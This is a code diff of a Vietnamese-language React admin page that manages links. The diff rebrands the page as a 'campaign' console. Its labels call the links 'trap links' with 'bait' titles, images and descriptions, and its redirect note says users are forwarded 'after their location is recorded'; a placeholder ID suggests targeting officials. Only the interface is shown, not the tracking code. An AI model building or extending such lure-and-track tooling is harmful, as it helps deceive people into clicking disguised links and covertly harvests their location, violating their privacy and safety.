@@ -1,4 +1,3 @@
-
 "use client"
 
 import * as React from "react"
@@ -42,6 +41,7 @@ import { getLinksAction, createLinkAction, deleteLinkAction, type Link } from "@
 import { PlusCircle, Copy, Eye, Trash2, Link as LinkIcon, RefreshCw } from "lucide-react"
 
 const formSchema = z.object({
+  id: z.string().optional(),
   title: z.string().min(1, "Tiêu đề là bắt buộc."),
   description: z.string().min(1, "Mô tả là bắt buộc."),
   imageUrl: z.string().url("Phải là một URL hình ảnh hợp lệ."),
@@ -57,6 +57,7 @@ export default function LinksPage() {
   const form = useForm<z.infer<typeof formSchema>>({
     resolver: zodResolver(formSchema),
     defaultValues: {
+      id: "",
       title: "",
       description: "",
       imageUrl: "",
@@ -99,7 +100,7 @@ export default function LinksPage() {
       toast({
         variant: "destructive",
         title: "Lỗi",
-        description: "Không thể tạo link.",
+        description: result.message || "Không thể tạo link.",
       })
     }
   }
@@ -142,7 +143,7 @@ export default function LinksPage() {
         <header className="flex h-16 shrink-0 items-center justify-between gap-2 border-b px-4">
           <div className="flex items-center gap-2">
             <SidebarTrigger />
-            <h1 className="text-xl font-bold font-headline">Quản lý Link</h1>
+            <h1 className="text-xl font-bold font-headline uppercase italic">Quản lý <span className="text-blue-500">Chiến dịch</span></h1>
           </div>
           <div className="flex items-center gap-2">
              <Button variant="outline" size="icon" onClick={fetchLinks} disabled={isLoading}>
@@ -150,53 +151,62 @@ export default function LinksPage() {
              </Button>
             <Dialog open={isModalOpen} onOpenChange={setIsModalOpen}>
               <DialogTrigger asChild>
-                <Button>
+                <Button className="bg-blue-600 hover:bg-blue-700">
                   <PlusCircle className="mr-2 h-4 w-4" />
                   Tạo Link Mới
                 </Button>
               </DialogTrigger>
-              <DialogContent className="sm:max-w-[600px]">
+              <DialogContent className="sm:max-w-[600px] bg-[#0d1117] border-slate-800 text-slate-300">
                 <DialogHeader>
-                  <DialogTitle>Tạo Link Theo Dõi Mới</DialogTitle>
-                  <DialogDescription>
-                    Điền thông tin bên dưới để tạo link xem trước (OG) và trang đích.
+                  <DialogTitle className="text-white italic uppercase">Thiết lập chiến dịch mới</DialogTitle>
+                  <DialogDescription className="text-slate-500">
+                    Điền thông tin bên dưới để tạo link bẫy (OG) và trang đích.
                   </DialogDescription>
                 </DialogHeader>
                 <Form {...form}>
-                  <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
-                    <FormField control={form.control} name="title" render={({ field }) => (
+                  <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4 pt-4">
+                    <FormField control={form.control} name="id" render={({ field }) => (
                       <FormItem>
-                        <FormLabel>Tiêu đề</FormLabel>
-                        <FormControl><Input placeholder="VD: Tài liệu quan trọng" {...field} /></FormControl>
+                        <FormLabel className="text-xs uppercase text-slate-500">Mã ID (Để trống nếu muốn tự động)</FormLabel>
+                        <FormControl><Input placeholder="VD: can-bo-01" className="bg-black border-slate-800 text-blue-500 font-mono" {...field} /></FormControl>
                         <FormMessage />
                       </FormItem>
                     )} />
+                    <div className="grid grid-cols-2 gap-4">
+                      <FormField control={form.control} name="title" render={({ field }) => (
+                        <FormItem>
+                          <FormLabel className="text-xs uppercase text-slate-500">Tiêu đề mồi</FormLabel>
+                          <FormControl><Input placeholder="VD: Tài liệu quan trọng" className="bg-black border-slate-800" {...field} /></FormControl>
+                          <FormMessage />
+                        </FormItem>
+                      )} />
+                      <FormField control={form.control} name="imageUrl" render={({ field }) => (
+                        <FormItem>
+                          <FormLabel className="text-xs uppercase text-slate-500">URL Hình ảnh mồi</FormLabel>
+                          <FormControl><Input placeholder="https://..." className="bg-black border-slate-800" {...field} /></FormControl>
+                          <FormMessage />
+                        </FormItem>
+                      )} />
+                    </div>
                     <FormField control={form.control} name="description" render={({ field }) => (
                       <FormItem>
-                        <FormLabel>Mô tả</FormLabel>
-                        <FormControl><Textarea placeholder="VD: Mô tả ngắn gọn về tài liệu của bạn." {...field} /></FormControl>
-                        <FormMessage />
-                      </FormItem>
-                    )} />
-                    <FormField control={form.control} name="imageUrl" render={({ field }) => (
-                      <FormItem>
-                        <FormLabel>URL Hình ảnh</FormLabel>
-                        <FormControl><Input placeholder="https://..." {...field} /></FormControl>
+                        <FormLabel className="text-xs uppercase text-slate-500">Mô tả mồi</FormLabel>
+                        <FormControl><Textarea placeholder="VD: Mô tả ngắn gọn về tài liệu..." className="bg-black border-slate-800" {...field} /></FormControl>
                         <FormMessage />
                       </FormItem>
                     )} />
                     <FormField control={form.control} name="redirectUrl" render={({ field }) => (
                       <FormItem>
-                        <FormLabel>URL Chuyển hướng</FormLabel>
-                        <FormControl><Input placeholder="https://..." {...field} /></FormControl>
-                        <FormDescription>Người dùng sẽ được chuyển đến URL này sau khi xác minh.</FormDescription>
+                        <FormLabel className="text-xs uppercase text-slate-500">Link đích (Redirect)</FormLabel>
+                        <FormControl><Input placeholder="https://..." className="bg-black border-slate-800 text-green-500" {...field} /></FormControl>
+                        <FormDescription className="text-[10px] italic">Người dùng sẽ được chuyển đến đây sau khi bị ghi lại vị trí.</FormDescription>
                         <FormMessage />
                       </FormItem>
                     )} />
-                    <DialogFooter>
-                      <Button type="button" variant="secondary" onClick={() => setIsModalOpen(false)}>Hủy</Button>
-                      <Button type="submit" disabled={form.formState.isSubmitting}>
-                        {form.formState.isSubmitting ? "Đang tạo..." : "Tạo & Sao chép Link"}
+                    <DialogFooter className="pt-4">
+                      <Button type="button" variant="outline" className="border-slate-800 hover:bg-slate-900" onClick={() => setIsModalOpen(false)}>Hủy</Button>
+                      <Button type="submit" className="bg-blue-600 hover:bg-blue-700 font-bold" disabled={form.formState.isSubmitting}>
+                        {form.formState.isSubmitting ? "Đang xử lý..." : "LƯU & SAO CHÉP"}
                       </Button>
                     </DialogFooter>
                   </form>
@@ -206,44 +216,48 @@ export default function LinksPage() {
           </div>
         </header>
         <main className="flex-1 p-6">
-          <div className="rounded-lg border bg-card text-card-foreground shadow-sm">
+          <div className="rounded-2xl border border-slate-800 bg-[#0d1117] overflow-hidden shadow-2xl">
             <Table>
-              <TableHeader>
-                <TableRow>
-                  <TableHead className="w-[40%]">Tiêu đề / Mô tả</TableHead>
-                  <TableHead>URL Chuyển hướng</TableHead>
-                  <TableHead className="text-right w-[200px]">Hành động</TableHead>
+              <TableHeader className="bg-black">
+                <TableRow className="border-slate-800 hover:bg-transparent">
+                  <TableHead className="w-[100px] text-[9px] uppercase font-black text-slate-500">ID</TableHead>
+                  <TableHead className="text-[9px] uppercase font-black text-slate-500">Chiến dịch / Nội dung mồi</TableHead>
+                  <TableHead className="text-[9px] uppercase font-black text-slate-500">Link Đích</TableHead>
+                  <TableHead className="text-right text-[9px] uppercase font-black text-slate-500">Thao tác</TableHead>
                 </TableRow>
               </TableHeader>
               <TableBody>
                 {isLoading ? (
-                  <TableRow><TableCell colSpan={3} className="text-center h-24">Đang tải...</TableCell></TableRow>
+                  <TableRow><TableCell colSpan={4} className="text-center h-48 italic text-slate-500">Đang truy xuất dữ liệu...</TableCell></TableRow>
                 ) : links.length > 0 ? (
                   links.map((link) => (
-                    <TableRow key={link.id}>
+                    <TableRow key={link.id} className="border-slate-800 hover:bg-blue-500/5 transition-all">
+                      <TableCell className="font-mono text-blue-500 text-xs font-bold">{link.id}</TableCell>
                       <TableCell>
-                        <div className="font-medium">{link.title}</div>
-                        <div className="text-xs text-muted-foreground truncate">{link.description}</div>
+                        <div className="font-bold text-white uppercase italic text-xs">{link.title}</div>
+                        <div className="text-[10px] text-slate-500 truncate max-w-md italic">{link.description}</div>
                       </TableCell>
                       <TableCell>
-                        <a href={link.redirectUrl} target="_blank" rel="noopener noreferrer" className="text-xs text-muted-foreground hover:text-primary truncate">{link.redirectUrl}</a>
+                        <a href={link.redirectUrl} target="_blank" rel="noopener noreferrer" className="text-[10px] text-green-500 hover:underline truncate block max-w-xs">{link.redirectUrl}</a>
                       </TableCell>
                       <TableCell className="text-right space-x-1">
-                        <Button variant="ghost" size="icon" onClick={() => handleCopy(link.id)}><Copy className="h-4 w-4" /></Button>
-                        <Button variant="ghost" size="icon" onClick={() => handleTest(link.id)}><Eye className="h-4 w-4" /></Button>
-                        <Button variant="ghost" size="icon" onClick={() => handleDelete(link.id)} className="text-destructive hover:text-destructive"><Trash2 className="h-4 w-4" /></Button>
+                        <Button variant="ghost" size="icon" className="h-8 w-8 text-slate-400 hover:text-blue-500" onClick={() => handleCopy(link.id)}><Copy className="h-4 w-4" /></Button>
+                        <Button variant="ghost" size="icon" className="h-8 w-8 text-slate-400 hover:text-white" onClick={() => handleTest(link.id)}><Eye className="h-4 w-4" /></Button>
+                        <Button variant="ghost" size="icon" className="h-8 w-8 text-slate-400 hover:text-red-500" onClick={() => handleDelete(link.id)}><Trash2 className="h-4 w-4" /></Button>
                       </TableCell>
                     </TableRow>
                   ))
                 ) : (
                   <TableRow>
-                    <TableCell colSpan={3} className="h-48 text-center">
+                    <TableCell colSpan={4} className="h-64 text-center">
                       <div className="flex flex-col items-center gap-4">
-                        <LinkIcon className="h-12 w-12 text-muted-foreground/30"/>
-                        <p className="text-muted-foreground">Chưa có link nào được tạo.</p>
-                        <DialogTrigger asChild>
-                            <Button variant="outline">Bắt đầu bằng cách tạo link đầu tiên</Button>
-                        </DialogTrigger>
+                        <div className="p-4 bg-slate-900 rounded-full">
+                          <LinkIcon className="h-10 w-10 text-slate-700"/>
+                        </div>
+                        <p className="text-slate-500 italic text-sm">Chưa có chiến dịch nào được khởi tạo.</p>
+                        <Button variant="outline" className="border-blue-500/30 text-blue-500 hover:bg-blue-500 hover:text-white rounded-xl" onClick={() => setIsModalOpen(true)}>
+                          Bắt đầu chiến dịch đầu tiên
+                        </Button>
                       </div>
                     </TableCell>
                   </TableRow>
